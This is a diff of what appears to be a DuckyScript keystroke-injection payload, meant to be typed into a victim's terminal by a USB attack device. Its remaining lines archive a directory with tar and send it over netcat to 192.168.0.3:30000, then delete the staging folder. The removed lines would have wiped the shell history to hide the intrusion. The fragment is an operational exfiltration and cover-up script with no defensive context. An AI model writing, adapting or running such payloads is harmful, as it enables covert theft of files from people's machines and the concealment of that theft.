@@ -23,8 +23,6 @@ ENTER
 STRING tar cf - temp_dir | nc 192.168.0.3 30000
 ENTER
 STRING rm -rf ~/temp_dir
-ENTER
-STRING rm ~/.bash_history
 CTRL x
 y
 ENTER
